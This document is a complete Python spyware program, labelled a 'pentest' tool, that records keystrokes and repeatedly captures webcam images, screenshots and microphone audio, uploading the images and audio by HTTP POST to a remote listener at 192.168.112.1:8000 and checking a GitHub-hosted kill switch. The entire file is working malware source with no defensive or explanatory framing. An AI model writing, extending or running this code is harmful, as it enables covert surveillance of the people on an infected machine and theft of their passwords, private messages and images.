import cv2
import sounddevice as sd
import numpy as np
from pynput import keyboard
import threading
import time
import os
import requests
from pydub import AudioSegment
from PIL import ImageGrab  # For screen capture

# === CONFIGURATION ===
LOG_DIR = "pentest_logs"
KILL_SWITCH_URL = "https://raw.githubusercontent.com/minizyperx/payload-controller/main/kill.txt"
UPLOAD_URL = "http://192.168.112.1:8000"  
ENABLE_UPLOAD = True  # Toggle file uploads

# === SETUP ===
os.makedirs(LOG_DIR, exist_ok=True)
RUNNING = True

def remote_kill_check():
    try:
        r = requests.get(KILL_SWITCH_URL, timeout=5)
        return "stop" in r.text.lower()
    except:
        return False

def upload_file(filepath):
    if not ENABLE_UPLOAD:
        return
    try:
        with open(filepath, 'rb') as f:
            res = requests.post(
                UPLOAD_URL,
                data=f.read(),
                headers={"X-Filename": os.path.basename(filepath)}
            )
        print(f"[UPLOAD] {filepath} -> {res.status_code}")
    except Exception as e:
        print(f"[UPLOAD FAILED] {filepath} -> {e}")

# Camera capture
def capture_camera(interval=5):
    while RUNNING and not remote_kill_check():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Error: Could not open camera.")
            break
        ret, frame = cap.read()
        if ret:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(LOG_DIR, f"camera_{timestamp}.png")
            cv2.imwrite(filename, frame)
            print(f"Camera capture saved: {filename}")
            upload_file(filename)
        cap.release()
        time.sleep(interval)

# Screen capture
def capture_screen(interval=5):
    while RUNNING and not remote_kill_check():
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(LOG_DIR, f"screen_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        print(f"Screenshot saved: {filename}")
        upload_file(filename)
        time.sleep(interval)

# Audio recording
def record_audio(duration=10, fs=44100):
    while RUNNING and not remote_kill_check():
        print("Recording audio...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(LOG_DIR, f"audio_{timestamp}.mp3")
        audio_segment = AudioSegment(
            data=recording.tobytes(),
            sample_width=recording.dtype.itemsize,
            frame_rate=fs,
            channels=2
        )
        audio_segment.export(filename, format="mp3")
        print(f"Audio saved: {filename}")
        upload_file(filename)

# Keystroke logging
def log_keystroke(key):
    try:
        keystroke = key.char
    except AttributeError:
        keystroke = str(key)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {keystroke}\n"
    log_file = os.path.join(LOG_DIR, "keystrokes.log")
    with open(log_file, "a") as f:
        f.write(log_entry)
    print(f"Logged: {log_entry.strip()}")

def on_press(key):
    log_keystroke(key)

def kill_monitor():
    global RUNNING
    while RUNNING:
        if remote_kill_check():
            print("[!] Kill switch triggered. Exiting...")
            RUNNING = False
        time.sleep(5)

# Main controller
def main():
    global RUNNING
    print("Starting enhanced keylogger with camera, mic, screen, and kill switch...")

    threads = [
        threading.Thread(target=capture_camera),
        threading.Thread(target=capture_screen),
        threading.Thread(target=record_audio),
        threading.Thread(target=kill_monitor)
    ]

    for t in threads:
        t.start()

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            RUNNING = False

    for t in threads:
        t.join()
    print("Pentest complete. Logs in:", LOG_DIR)

if __name__ == "__main__":
    main()
